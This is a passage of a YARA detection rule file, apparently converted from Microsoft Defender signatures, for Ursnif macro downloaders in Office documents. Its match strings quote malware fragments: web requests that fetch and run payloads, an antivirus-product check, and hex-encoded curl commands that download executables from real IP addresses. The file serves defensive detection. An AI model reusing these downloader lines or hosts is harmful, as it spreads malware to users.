        $x_1_2 = "For i = 0 To 8: bbb = bbb & Chr(Map1(Int(62 * Rnd()))): Next i" ascii //weight: 1
        $x_1_3 = "Set MR = CreateObject(DecodeSTR(\"" ascii //weight: 1
        $x_1_4 = "Call MR.SetTimeouts(0, 2000, 2000, 5000)" ascii //weight: 1
        $x_1_5 = "MR.Open \"GET\", DecodeSTR(\"" ascii //weight: 1
        $x_1_6 = "\") & \"?\" & bbb & \"=\" & bbb" ascii //weight: 1
        $x_1_7 = ".setRequestHeader \"Cache-Control\", \"no-cache\"" ascii //weight: 1
        $x_1_8 = ".setRequestHeader \"Pragma\", \"no-cache\"" ascii //weight: 1
        $x_1_9 = ".send" ascii //weight: 1
        $x_1_10 = ".WaitForResponse" ascii //weight: 1
        $x_1_11 = "bbb = .ResponseText" ascii //weight: 1
        $x_1_12 = "rpRes = RunPE(Base64Decode(bbb))" ascii //weight: 1
        $x_1_13 = "Application.Quit (wdDoNotSaveChanges)" ascii //weight: 1
        $x_1_14 = "Private Sub WindowsMediaPlayer1_OpenStateChange(ByVal NewState As Long)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AG_2147817984_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AG!MSR"
        threat_id = "2147817984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub G8G1K4()" ascii //weight: 1
        $x_1_2 = "Set daraufh = headb.CreateTextFile(\"C:\\ProgramData\\graniteb.txt\")" ascii //weight: 1
        $x_1_3 = "Set showsp = believesp.execquery(\"select * from antivirusproduct\", \"wql\", 0)" ascii //weight: 1
        $x_1_4 = "daraufh.Write \"function eBooksj($detectivef){$platformi = [Net.WebRequest]::Create('https://TheFinanceInvest.com/'+$detectivef);$platformi.Method='GET';" ascii //weight: 1
        $x_1_5 = "impartiale = \"C:\\ProgramData\\prncnfg.txt\"" ascii //weight: 1
        $x_1_6 = "answeredr = strongerj Or InStr(difficultyf, \"F-Secure\") Or InStr(difficultyf, \"BitDefender\")" ascii //weight: 1
        $x_1_7 = "CreateObject(\"Shell.Application\").ShellExecute \"cscript.exe\", \"C:\\windows\\System32\\Printing_Admin_Scripts\\en-US\\prnport.v\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PDC_2147818749_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PDC!MTB"
        threat_id = "2147818749"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mo((replace(rtrim(h),\"\",\"a\")))," ascii //weight: 1
        $x_1_2 = ",destination:=activesheet.range(\"$a$2\"))." ascii //weight: 1
        $x_1_3 = "=hubb&\"\"&pareggiato&\",#1/q\"shellpresiedereendfunctionfunctionhermu()" ascii //weight: 1
        $x_1_4 = "=sanguinanti(left(environ(app44(\"" ascii //weight: 1
        $x_1_5 = "deee=deee+rrnextapp44=deeeendfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_KAAQ_2147820233_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.KAAQ!MTB"
        threat_id = "2147820233"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"Scripting.\": xDww = xDww & \"FileSystemObject\"" ascii //weight: 1
        $x_1_2 = "CreateObject(xDww)" ascii //weight: 1
        $x_1_3 = "bt.GetSpecialFolder(0 + Tiuuti) & \"\\\" & GG & \".\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_KAAV_2147821325_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.KAAV!MTB"
        threat_id = "2147821325"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= DSw.th32ProcessID" ascii //weight: 1
        $x_1_2 = "= Split(Range(\"I79:I79\"), \",\")" ascii //weight: 1
        $x_1_3 = "Workbooks.Application.DisplayAlerts = Bn: Application.Quit" ascii //weight: 1
        $x_1_4 = "pinnS = Environ(\"Temp\") & \"\\\" & ty & \".\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RVE_2147823998_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RVE!MTB"
        threat_id = "2147823998"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open famaile(\"Yf-9T08G_3E\"), Adreus, False" ascii //weight: 1
        $x_1_2 = "CreateObject(famaile(\"_9DrYA.a8DSm03Ot-fBe\"))" ascii //weight: 1
        $x_1_3 = "Foglioo = GetObject((bio)).Get((energ))" ascii //weight: 1
        $x_1_4 = "Mid$(cLight, k, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RVE_2147823998_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RVE!MTB"
        threat_id = "2147823998"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(Z & Ihomm)" ascii //weight: 1
        $x_1_2 = {28 6e 69 75 28 31 30 2c 20 31 34 29 29 3a 20 [0-5] 20 3d 20 [0-10] 28 6e 69 75 28 31 35 2c 20 32 31 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "qAqua.Open Z & ocmoS, sJimm, False," ascii //weight: 1
        $x_1_4 = {45 6e 76 69 72 6f 6e [0-1] 28 28 28 6e 69 75 28 32 38 2c 20 32 39 29 29 29 29 20 26 20 22 5c 22}  //weight: 1, accuracy: Low
        $x_1_5 = ".Write qAqua.responseBody: .SaveToFile hlII," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_AMA_2147825271_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.AMA!MTB"
        threat_id = "2147825271"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".SaveToFile Tooi, Abs(CInt(Nads)) + 1" ascii //weight: 1
        $x_1_2 = "cemS(Tio(\"ts/rnstlohp/oieoact:mevri.m\")," ascii //weight: 1
        $x_1_3 = "Tio(\"esr2/ rgv3 s\") & r" ascii //weight: 1
        $x_1_4 = {54 69 6f 28 22 69 6d 6d 73 77 6e 67 74 3a 22 29 3a [0-15] 3d 20 54 69 6f 28 22 69 32 72 65 57 33 50 63 73 6e 5f 6f 73 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {28 22 22 20 26 20 [0-15] 2c 20 4c 65 6e 28 00 29 20 2a 20 38 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PAA_2147826411_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PAA!MTB"
        threat_id = "2147826411"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ct(truej(\"5hdbtaxjo.rmiadse\"))#endifflibustiero.opentruej(\"91emztrg\"),tbooks,false,rollers,aboar" ascii //weight: 1
        $x_1_2 = "y.savetofileapancil,abs(cint(institute))+1endwithcoolegium=len(dir(apancil))>0" ascii //weight: 1
        $x_1_3 = "n((\"temp\"))&\"\\\"endfunctionsubselection_s()alia=vintegerareawidths=coolegium(truej(\"qhp/onco_jts/ma.m>\\t:daic\"),alia)a" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RVF_2147826441_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RVF!MTB"
        threat_id = "2147826441"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 45 78 65 63 20 28 22 63 6d 64 20 2f 63 20 63 75 72 6c 20 68 74 74 70 3a 2f 2f 31 30 39 2e 32 34 38 2e 31 31 2e 31 35 35 2f 6e 65 74 77 6f 72 6b 2e 65 78 65 20 2d 6f 20 25 41 50 50 44 41 54 41 25 5c [0-20] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 45 78 65 63 20 28 22 63 6d 64 20 2f 63 20 63 75 72 6c 20 68 74 74 70 3a 2f 2f 31 39 31 2e 31 30 31 2e 32 2e 33 39 2f 69 6e 73 74 61 6c 6c 61 7a 69 6f 6e 65 2e 65 78 65 20 2d 6f 20 25 41 50 50 44 41 54 41 25 5c [0-20] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PDD_2147826450_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PDD!MTB"
        threat_id = "2147826450"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "((replace(rtrim(h),\"\",\"a\")))," ascii //weight: 1
        $x_1_2 = "destination:=activesheet.range(\"$a$2\"))." ascii //weight: 1
        $x_1_3 = "=hubb&\"\"&ambasso&\",#1/q\"shellnigojiendfunctionfunctionhermu()" ascii //weight: 1
        $x_1_4 = "=bidingo(left(environ(ooy(" ascii //weight: 1
        $x_1_5 = "deee=deee+rrnextooy=deeeendfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PDUA_2147826462_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PDUA!MTB"
        threat_id = "2147826462"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=createobject(nexxt(\"5hdbtaxjo.rmiadse\"))#endifvbarf.opennexxt(\"91emztrg\")" ascii //weight: 1
        $x_1_2 = "=vba.environ((\"temp\"))&\"\\\"endfunction" ascii //weight: 1
        $x_1_3 = "=comedy(nexxt(\"qhp/onco_jts/ma.m>\\t:daic\"),sk)xareaxareahight=vivaldi(vaar(\"\"&sk))endsubfunction" ascii //weight: 1
        $x_1_4 = "=getobject(sii).get(uu)how" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_RVG_2147827176_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.RVG!MTB"
        threat_id = "2147827176"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 22 68 74 74 70 3a 2f 2f 69 6e 74 65 72 22 26 [0-10] 26 6f 72 69 6f 73 26 22 2e 63 6f 6d 22 6f 78 68 74 74 70 2e 6f 70 65 6e 22 67 65 74 22 2c 6b 69 6f 65 72 2c 66 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = {22 6e 64 6c 6c 22 26 6f 72 69 6f 73 70 6c 3d 22 72 75 22 26 6f 72 69 6f 73 26 [0-10] 3a 77 69 74 68 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {26 65 6e 76 69 72 6f 6e 24 28 22 75 73 65 72 70 72 6f 66 69 6c 65 22 29 26 22 5c 64 6f 63 75 6d 65 6e 74 73 22 26 5f 61 70 70 6c 69 63 61 74 69 6f 6e 2e 70 61 74 68 73 65 70 61 72 61 74 6f 72 26 [0-20] 3d 6c 65 6e 28 6b 6c 69 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PDE_2147827192_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PDE!MTB"
        threat_id = "2147827192"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=replace(rtrim(cvs_list(feticismo)),\"-\",\"aa\")endfunctionfunction" ascii //weight: 1
        $x_1_2 = "len(gestivo))forsbava=1tocampagnola(yokohama)yokohama(sbava)=mid(gestivo,sbava,1)nextforeachindos" ascii //weight: 1
        $x_1_3 = "=mid(strdata,5)wenddecodebase64=outarrayendfunctionpublicfunctionfuchinni(rngasstring)cnt=3736fuchinni=right(rng,len(rng)-cnt)endfunctionfunctionabb" ascii //weight: 1
        $x_1_4 = "=brevettato(left(environ(cojones(\"5-38c-o0m9s7p101ec3\")),20)&cojones(\"-11r3-e80g,s710v-8r1\")&\"32.\"&cojones" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PDUB_2147827234_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PDUB!MTB"
        threat_id = "2147827234"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= kFonda(cValute(\"Ihsfs.)?t:itc=Ep/rrmREt/eao\"), m)" ascii //weight: 1
        $x_1_2 = "fLogica = UAres & Application." ascii //weight: 1
        $x_1_3 = "= VBA.Environ(((\"TEmp\"))) & \"\\\"" ascii //weight: 1
        $x_1_4 = "= GetObject(fa).Get(nnt)" ascii //weight: 1
        $x_1_5 = ".Open \"\" & RY, ViU, False, \"\", \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PDG_2147828551_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PDG!MTB"
        threat_id = "2147828551"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "marvell(ing)marvell=environ(\"systemdrive\")&environ(\"homepath\")&_application." ascii //weight: 1
        $x_1_2 = "&fori=0to9s=bro(s,ami(i))nextprinted=sendfunctionfunctionami(se)ami=cstr(se)endfunctionfunction" ascii //weight: 1
        $x_1_3 = "bro(h,hh)bro=replace(h,hh,\"\")endfunction" ascii //weight: 1
        $x_1_4 = "=atmosphere(0,declara,plongptr,0,0)dow=shell(fierra(plongptr))endsubfunctionprinted(s)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_APD_2147828562_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.APD!MTB"
        threat_id = "2147828562"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=createobject(z&ihomm)#" ascii //weight: 1
        $x_1_2 = "=vba.environ(((niu(28,29))))&\"\\\"endfunction" ascii //weight: 1
        $x_1_3 = "=getobject(vv)setdf=dd.get(bn)seter=df.create" ascii //weight: 1
        $x_1_4 = "=getobject(sii)tff=7setjam=muu.get(roo)setandre=jam.create" ascii //weight: 1
        $x_1_5 = ".openz&ocmos,sjimm,false,z,z" ascii //weight: 1
        $x_1_6 = "=\"a\"&a&\":\"&\"ha\"&bsetd=range(t)foreachfiind.special" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_SAA_2147829239_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.SAA!MTB"
        threat_id = "2147829239"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= GetObject((SeY)).Get((SyI))" ascii //weight: 1
        $x_1_2 = "= Internationale(HaBB(\"(!pzry3so.&h:pcrt/omvt/xo\"), fo)" ascii //weight: 1
        $x_1_3 = "= HaBB(\"_5MMP0,LL.IM2H6fXXT0hS.T.\")" ascii //weight: 1
        $x_1_4 = "= CreateObject(\"\" & TT)" ascii //weight: 1
        $x_1_5 = ".Write wolF.responseBody: .SaveToFile GumVu," ascii //weight: 1
        $x_1_6 = "= New MSXML2.XMLHTTP60" ascii //weight: 1
        $x_1_7 = ".Open \"\" & RY, ViU, False, \"\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_KEKE_2147831854_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.KEKE!MTB"
        threat_id = "2147831854"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fe.STARTUPINFO.cb = LenB(fe): fe.STARTUPINFO.qweejjj = am" ascii //weight: 1
        $x_1_2 = "= himme(\"erxeprlo\")" ascii //weight: 1
        $x_1_3 = "= \"r esg-s v2r3\"" ascii //weight: 1
        $x_1_4 = "= Environ(\"Temp\") & \"\\\" & ty & \".\"" ascii //weight: 1
        $x_1_5 = "himme(\"h tmtopcs.:a/i/ndaokmiin\"), BpinnS, xlTop10Bottom, xlReport1) = ty - ty Then Debug.Print " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PKY_2147835813_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PKY!MTB"
        threat_id = "2147835813"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DecodeBase64((bumerangus(arMani(\"5;6h-t20t p6s :\") & \"://\" & arMani(\"mederaogs\") & \".\" & arMani(\"/c12o-m\")))), Farmaci" ascii //weight: 1
        $x_1_2 = "Application.DefaultFilePath" ascii //weight: 1
        $x_1_3 = "Private Function DecodeBase64(strData)" ascii //weight: 1
        $x_1_4 = "= Donati & arMani(\"0\\9c6al9c\") & \".\" & arMani(\"9e7-x5e\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PKZ_2147836331_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PKZ!MTB"
        threat_id = "2147836331"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c 22 20 26 20 49 6e 74 28 [0-15] 20 2a 20 52 6e 64 29 20 2b 20 [0-15] 20 26 20 22 2e 22}  //weight: 1, accuracy: Low
        $x_1_2 = {44 65 63 6f 64 65 42 61 73 65 36 34 28 28 [0-15] 28 [0-15] 28 22 31 31 35 3b 36 68 2d 74 32 30 74 20 32 70 36 73 20 3a 31 22 29 20 26 20 22 3a 2f 2f 22 20 26 20 [0-15] 28 22 63 68 65 63 68 6f 61 22 29 20 26 20 22 2e 22 20 26 20 [0-15] 28 22 2f 2d 63 31 32 6f 2d 33 6d 33 22 29 29 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {4c 65 66 74 28 45 6e 76 69 72 6f 6e 28 [0-15] 28 22 2d 33 38 63 2d 6f 30 6d 20 3b 73 37 70 31 30 31 65 63 33 22 29 29 2c 20 32 30 29 20 26 20 [0-15] 28 22 31 31 72 33 2d 65 38 20 30 67 2c 73 37 3b 31 30 76 20 38 72 31 22 29 20 26 20 22 33 32 2e 22 20 26 20 [0-15] 28 22 31 65 20 37 2d 78 3b 65 31 2d 22 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {30 5c 39 63 36 61 6c 39 63 37 22 29 20 26 20 22 2e 22 20 26 20 [0-15] 28 22 2d 39 65 37 2d 78 35 65 2d 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {44 65 62 75 67 2e 50 72 69 6e 74 20 [0-15] 28 [0-15] 2c 20 [0-15] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_OJP_2147837917_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.OJP!MTB"
        threat_id = "2147837917"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= eliminano(\"9 H/11cV T3 5s8taOr6t \", 1)" ascii //weight: 1
        $x_1_2 = "eliminano(\"7 J 8ruN9nd54llK\", 3) & 32 & " ascii //weight: 1
        $x_1_3 = "& eliminano(\"8\\AcN4BaJ8l0c532.8eYxE7e1\", 3)" ascii //weight: 1
        $x_1_4 = "(CreateObject(\"wscript.shell\").exec(Exel).StdOut.ReadAll()): Workbooks.Application.DisplayAlerts = False: Application.Quit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_SRR_2147841155_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.SRR!MTB"
        threat_id = "2147841155"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ$(\"USERPROFILE\") & \"\\Documents\" & _" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"MSXML2.XMLHTTP\")" ascii //weight: 1
        $x_1_3 = "deformato.Open \"get\", squilibrati, False" ascii //weight: 1
        $x_1_4 = "deformato.setRequestHeader \"etag\", \"fetch\"" ascii //weight: 1
        $x_1_5 = "MsgBox (Len(resistermi((intrecciato(\"h33t1tp30s:1//25li15jos1a.c80o4m\")))) - 404)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_SJT_2147842433_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.SJT!MTB"
        threat_id = "2147842433"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 22 68 74 74 70 3a 2f 2f 69 6e 74 65 72 22 20 26 20 [0-15] 20 26 20 4f 72 69 6f 73 20 26 20 22 2e 63 6f 6d 22}  //weight: 1, accuracy: Low
        $x_1_2 = " = .Run(Pl & \"  InetCpl.cpl,ClearMyTracksByProcess 255\", 0, True): End With" ascii //weight: 1
        $x_1_3 = {28 49 6e 74 28 [0-15] 20 2a 20 52 6e 64 29 20 2b 20 [0-15] 29 20 26 20 22 2e 63 76 73 22}  //weight: 1, accuracy: Low
        $x_1_4 = "= \",#\" & Len(oXHTTP.getResponseHeader(\"Akamai-GRN\"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Ursnif_PFN_2147898435_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Ursnif.PFN!MTB"
        threat_id = "2147898435"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Ursnif"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 22 5c 22 20 26 20 49 6e 74 28 [0-15] 20 2a 20 52 6e 64 29 20 2b 20 [0-15] 20 26 20 22 2e 22}  //weight: 1, accuracy: Low
